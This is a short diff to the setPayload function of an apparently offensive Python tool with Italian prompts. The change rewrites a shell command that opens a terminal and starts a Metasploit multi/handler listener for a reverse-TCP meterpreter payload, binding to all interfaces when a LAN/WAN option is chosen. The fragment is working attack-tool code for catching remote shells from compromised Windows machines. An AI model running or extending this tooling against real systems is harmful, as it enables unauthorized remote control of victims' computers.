@@ -312,7 +312,10 @@ def setPayload():
         
         msf = input(f"\nAvviare {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
         if msf.lower() == "y":
-            command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use windows/meterpreter/reverse_tcp; set LHOST {HOST}; set LPORT {LPORT}, exploit; exploit; exec bash\"'"
+            if lanORwan.lower() == "y":
+                HOST = '0.0.0.0'
+            else: pass
+            command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {payload}; set LHOST {HOST}; set LPORT {LPORT}; exploit; exec bash\"'"
             subprocess.run(command, shell=True)
             return menu()
         elif msf.lower() == "n":
